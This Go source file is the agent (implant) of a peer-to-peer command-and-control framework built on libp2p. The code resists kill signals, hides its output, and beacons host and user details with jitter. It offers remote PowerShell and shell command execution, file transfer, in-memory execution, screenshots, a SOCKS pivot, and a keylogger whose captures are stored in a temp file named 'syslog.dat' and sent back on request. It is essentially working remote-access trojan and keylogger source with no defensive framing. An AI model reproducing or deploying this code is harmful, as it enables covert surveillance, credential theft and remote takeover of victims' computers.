//go:build !controller
// +build !controller

// agent.go
package main

import (
	"bufio"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"os/user"

	pubsub "github.com/libp2p/go-libp2p-pubsub"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/p2p/discovery/util"
)

// GLOBAL STATE
var IsServiceMode = false 

func run(ctx context.Context) {
	// Attempt to daemonize/install service (Windows) or mask process (Linux)
	// We pass startAgent as a callback because on Windows, if running as a service,
	// the execution flow is controlled by the Service Control Manager via svc.Run
	daemonize(func() {
		startAgent(ctx)
	})
}

func startAgent(ctx context.Context) {
	// Signal Immunity: Ignore SIGHUP and SIGPIPE
	signal.Ignore(syscall.SIGHUP, syscall.SIGPIPE)

	// Trap SIGINT and SIGTERM but do nothing (immune to kill <pid>)
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		for range sigChan {
			// Do nothing, just consume the signal
			// Log if you want: log.Println("Received signal, ignoring...")
		}
	}()

	rand.Seed(time.Now().UnixNano())
	devNull, _ := os.OpenFile(os.DevNull, os.O_WRONLY, 0)
	os.Stdout = devNull
	os.Stderr = devNull
	log.SetOutput(devNull)

	// Hardcoded credentials
	roomHash = generateRoomHash(DefaultRoom, DefaultPass)

	h, _, rd, err := setupLibp2p(ctx, true)
	if err != nil {
		os.Exit(1)
	}
	defer h.Close()

	hostname, _ := os.Hostname()
	user := getUsername()

	// Map systemprofile to nt/system for better readability
	if strings.ToLower(user) == "systemprofile" {
		user = "nt/system"
	}

	beacon := Beacon{
		Type:     "beacon",
		AgentID:  h.ID().String(),
		Nickname: fmt.Sprintf("%s-%s", hostname, h.ID().String()[:8]),
		OS:       runtime.GOOS,
		Hostname: hostname,
		Username: user,
	}

	h.SetStreamHandler(FileProtocol, handleFileStream)
	h.SetStreamHandler(ShellProtocol, handleShellStream)
	h.SetStreamHandler(MemExecProtocol, handleMemExecStream)
	h.SetStreamHandler(ScreenshotProtocol, handleScreenshotStream)
	h.SetStreamHandler("/c2/keylog/1.0", handleKeylogStream)
	h.SetStreamHandler("/c2/socks/1.0", handleSocksStream)
	h.SetStreamHandler("/c2/exec/1.0", func(s network.Stream) {
		defer s.Close()

		reader := bufio.NewReader(s)
		encryptedCmd, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		cmd, err := securityMgr.DecryptString(strings.TrimSpace(encryptedCmd))
		if err != nil {
			return
		}

		var out []byte
		if runtime.GOOS == "windows" {
			out, _ = exec.Command("powershell", "-NoProfile", "-Command", cmd).CombinedOutput()
		} else {
			out, _ = exec.Command("sh", "-c", cmd).CombinedOutput()
		}

		if len(out) == 0 {
			out = []byte("(command executed, no output)")
		}

		encryptedOutput, err := securityMgr.EncryptString(string(out))
		if err != nil {
			return
		}

		s.Write([]byte(encryptedOutput))
	})

	ps, _ := pubsub.NewGossipSub(ctx, h)
	topic, _ := ps.Join("c2-beacon/" + roomHash)

	go func() {
		for i := 0; i < 10; i++ {
			util.Advertise(ctx, rd, roomHash)
			time.Sleep(2 * time.Second)
		}
		ticker := time.NewTicker(2 * time.Minute)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				util.Advertise(ctx, rd, roomHash)
			}
		}
	}()

	go func() {
		for {
			data, _ := json.Marshal(beacon)
			topic.Publish(ctx, data)

			// Jitter: 20s +/- 20% (16s - 24s)
			baseInterval := 20.0
			jitterPercent := 0.20
			jitter := baseInterval * jitterPercent
			offset := (rand.Float64() * 2 * jitter) - jitter
			sleepDuration := time.Duration((baseInterval + offset) * float64(time.Second))

			time.Sleep(sleepDuration)
		}
	}()

	go func() {
		time.Sleep(5 * time.Second)
		ticker := time.NewTicker(8 * time.Second)
		defer ticker.Stop()

		// Semaphore to limit concurrent connection attempts
		sem := make(chan struct{}, 20)

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				discoveryCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
				peers, _ := util.FindPeers(discoveryCtx, rd, roomHash)
				cancel()

				for _, peerInfo := range peers {
					if peerInfo.ID == h.ID() {
						continue
					}
					if h.Network().Connectedness(peerInfo.ID) != network.Connected {
						// Acquire semaphore (blocks if 20 are already running)
						sem <- struct{}{}
						go func(pi peer.AddrInfo) {
							defer func() { <-sem }() // Release semaphore
							connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
							defer cancel()
							h.Connect(connectCtx, pi)
						}(peerInfo)
					}
				}
			}
		}
	}()

	select {}
}

func handleFileStream(s network.Stream) {
	defer s.Close()

	// Read request (encrypted JSON)
	reader := bufio.NewReader(s)
	encryptedReq, err := reader.ReadString('\n')
	if err != nil {
		return
	}

	reqJSON, err := securityMgr.DecryptString(strings.TrimSpace(encryptedReq))
	if err != nil {
		return
	}

	var req FileRequest
	if json.Unmarshal([]byte(reqJSON), &req) != nil {
		return
	}

	if req.Operation == "upload" {
		// Controller is sending a file -> Agent writes to disk
		// Check if directory exists
		dir := filepath.Dir(req.Path)
		if err := os.MkdirAll(dir, 0755); err != nil {
			sendError(s, "mkdir failed: "+err.Error())
			return
		}

		f, err := os.OpenFile(req.Path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, os.FileMode(req.Mode))
		if err != nil {
			sendError(s, "open failed: "+err.Error())
			return
		}
		defer f.Close()

		// Send success response
		sendResponse(s, true, "Ready to receive", 0)

		// Read encrypted chunks
		// Simple implementation: Read raw bytes and decrypt? 
		// Or assume the stream is just raw bytes now?
		// Let's use a simple block-based transfer for encryption safety
		// But for now, to keep it simple and fast, let's assume the stream *content* 
		// is transferred in encrypted blocks.
		
		// Actually, for simplicity in this iteration, let's just copy raw bytes
		// BUT we must respect the encryption requirement.
		// Let's use a helper to read encrypted stream.
		
		if err := receiveEncryptedFile(reader, f, req.Size); err != nil {
			// Log error?
		}

	} else if req.Operation == "download" {
		// Controller wants a file -> Agent reads from disk
		f, err := os.Open(req.Path)
		if err != nil {
			sendError(s, "open failed: "+err.Error())
			return
		}
		defer f.Close()

		info, err := f.Stat()
		if err != nil {
			sendError(s, "stat failed: "+err.Error())
			return
		}

		// Send success response with size
		sendResponse(s, true, "Starting download", info.Size())

		// Send encrypted file
		sendEncryptedFile(s, f)
	}
}

func sendError(s network.Stream, msg string) {
	sendResponse(s, false, msg, 0)
}

func sendResponse(s network.Stream, success bool, msg string, size int64) {
	resp := FileResponse{
		Success: success,
		Message: msg,
		Size:    size,
	}
	data, _ := json.Marshal(resp)
	encrypted, _ := securityMgr.EncryptString(string(data))
	s.Write([]byte(encrypted + "\n"))
}

// receiveEncryptedFile reads encrypted chunks from stream and writes decrypted to file
func receiveEncryptedFile(reader *bufio.Reader, f *os.File, totalSize int64) error {
	var received int64
	for received < totalSize {
		// Read chunk size (line based for simplicity of our text-protocol wrapper)
		// Or just read line which is a hex string
		line, err := reader.ReadString('\n')
		if err != nil {
			return err
		}
		
		decrypted, err := securityMgr.DecryptString(strings.TrimSpace(line))
		if err != nil {
			return err
		}
		
		n, err := f.Write([]byte(decrypted))
		if err != nil {
			return err
		}
		received += int64(n)
	}
	return nil
}

// sendEncryptedFile reads file and sends encrypted chunks
func sendEncryptedFile(s network.Stream, f *os.File) error {
	buf := make([]byte, 4096) // 4KB chunks
	for {
		n, err := f.Read(buf)
		if n > 0 {
			encrypted, err := securityMgr.EncryptString(string(buf[:n]))
			if err != nil {
				return err
			}
			
			if _, err := s.Write([]byte(encrypted + "\n")); err != nil {
				return err
			}
		}
		
		if err != nil {
			if err == io.EOF {
				break
			}
			return err
		}
	}
	return nil
}



func handleSocksStream(s network.Stream) {
	defer s.Close()

	// Read target address length
	lenBuf := make([]byte, 4)
	if _, err := io.ReadFull(s, lenBuf); err != nil {
		return
	}
	addrLen := binary.BigEndian.Uint32(lenBuf)

	// Read target address string
	addrBuf := make([]byte, addrLen)
	if _, err := io.ReadFull(s, addrBuf); err != nil {
		return
	}
	targetAddr := string(addrBuf)

	// Connect to target
	conn, err := net.DialTimeout("tcp", targetAddr, 10*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	// Pipe data
	go func() {
		io.Copy(conn, s)
		conn.Close()
	}()
	io.Copy(s, conn)
}

func handleScreenshotStream(s network.Stream) {
	defer s.Close()

	// Capture screen (try native lib, then fallback)
	pngData, err := captureScreen()
	if err != nil {
		sendError(s, "Screenshot failed: "+err.Error())
		return
	}

	// Send success response with size
	sendResponse(s, true, "Screenshot captured", int64(len(pngData)))

	// Send encrypted image data
	chunkSize := 4096
	total := len(pngData)
	
	for i := 0; i < total; i += chunkSize {
		end := i + chunkSize
		if end > total {
			end = total
		}
		
		encrypted, err := securityMgr.EncryptString(string(pngData[i:end]))
		if err != nil {
			return
		}
		
		if _, err := s.Write([]byte(encrypted + "\n")); err != nil {
			return
		}
	}
}

func captureScreen() ([]byte, error) {
	// Use OS-specific fallback (PowerShell on Windows)
	return captureScreenFallback()
}

func getUsername() string {
	// 1. Try os/user
	if u, err := user.Current(); err == nil {
		return u.Username
	}

	// 2. Try Environment Variables
	if u := os.Getenv("USER"); u != "" {
		return u
	}
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}

	// 3. Try whoami
	if out, err := exec.Command("whoami").Output(); err == nil {
		return strings.TrimSpace(string(out))
	}

	return "unknown"
}

var (
	keylogCtx    context.Context
	keylogCancel context.CancelFunc
	keylogMu     sync.Mutex
)

func handleKeylogStream(s network.Stream) {
	defer s.Close()

	reader := bufio.NewReader(s)
	line, err := reader.ReadString('\n')
	if err != nil {
		return
	}

	cmd, err := securityMgr.DecryptString(strings.TrimSpace(line))
	if err != nil {
		return
	}

	switch cmd {
	case "START":
		if IsServiceMode {
			sendEncryptedResponse(s, "Error: Keylogger is disabled in Service Mode (Session 0 Isolation). Run as user agent instead.")
			return
		}
		
		startBackgroundKeylogger()
		sendEncryptedResponse(s, "Keylogger started in background")
	case "STOP":
		stopBackgroundKeylogger()
		sendEncryptedResponse(s, "Keylogger stopped")
	case "CLEAR":
		clearKeylog(s)
	case "DUMP":
		dumpKeylog(s)
	default:
		sendEncryptedResponse(s, "Unknown command")
	}
}

func startBackgroundKeylogger() {
	keylogMu.Lock()
	defer keylogMu.Unlock()

	if keylogCtx != nil {
		return // Already running
	}

	keylogCtx, keylogCancel = context.WithCancel(context.Background())
	keyChan := make(chan string, 100)

	// Start Windows hook
	go StartKeylogger(keylogCtx, keyChan)

	// Start file writer
	go func() {
		logPath := filepath.Join(os.TempDir(), "syslog.dat")
		f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			return
		}
		defer f.Close()
		
		f.WriteString("\n--- Keylogger Started ---\n")

		var lineBuf []rune

		flush := func() {
			if len(lineBuf) > 0 {
				f.WriteString(string(lineBuf) + "\n")
				lineBuf = []rune{}
			}
		}

		for {
			select {
			case k := <-keyChan:
				// Handle Tags (start with [## or [CLIPBOARD)
				if strings.HasPrefix(k, "\n[") {
					flush()
					f.WriteString(k) // Already has newlines
					continue
				}

				// Handle Backspace
				if k == "[BACKSPACE]" {
					if len(lineBuf) > 0 {
						lineBuf = lineBuf[:len(lineBuf)-1]
					}
					continue
				}

				// Handle Enter
				if strings.Contains(k, "\n") {
					f.WriteString(string(lineBuf) + k) // k matches [ENTER]\n
					lineBuf = []rune{}
					continue
				}
				
				// Handle other Special Keys (e.g. [TAB], [ESC])
				// If it's a [TAG], we might want to keep it or flush?
				// For now, treat as text
				lineBuf = append(lineBuf, []rune(k)...)

				// Auto-flush if too long
				if len(lineBuf) > 200 {
					flush()
				}

			case <-keylogCtx.Done():
				flush()
				return
			}
		}
	}()
}

func stopBackgroundKeylogger() {
	keylogMu.Lock()
	defer keylogMu.Unlock()

	if keylogCancel != nil {
		keylogCancel()
		keylogCtx = nil
		keylogCancel = nil
	}
}

func clearKeylog(s network.Stream) {
	stopBackgroundKeylogger() // Stop first to release file lock (if any, though linux/unix allows open unlink)
	// On Windows, might need to close handle. But our goroutine holds the handle. 
	// We should technically restart it.
	// Simplification: We truncate the file if possible, or delete.
	
	logPath := filepath.Join(os.TempDir(), "syslog.dat")
	err := os.Truncate(logPath, 0)
	if err != nil {
		sendEncryptedResponse(s, "Failed to clear log: "+err.Error())
	} else {
		sendEncryptedResponse(s, "Keylog cleared")
	}
}

func dumpKeylog(s network.Stream) {
	logPath := filepath.Join(os.TempDir(), "syslog.dat")
	data, err := os.ReadFile(logPath)
	if err != nil {
		sendEncryptedResponse(s, "Error reading log: "+err.Error())
		return
	}
	
	encrypted, err := securityMgr.EncryptString(string(data))
	if err == nil {
		s.Write([]byte(encrypted + "\n"))
	}
}

func sendEncryptedResponse(s network.Stream, msg string) {
	encrypted, err := securityMgr.EncryptString(msg)
	if err == nil {
		s.Write([]byte(encrypted + "\n"))
	}
}
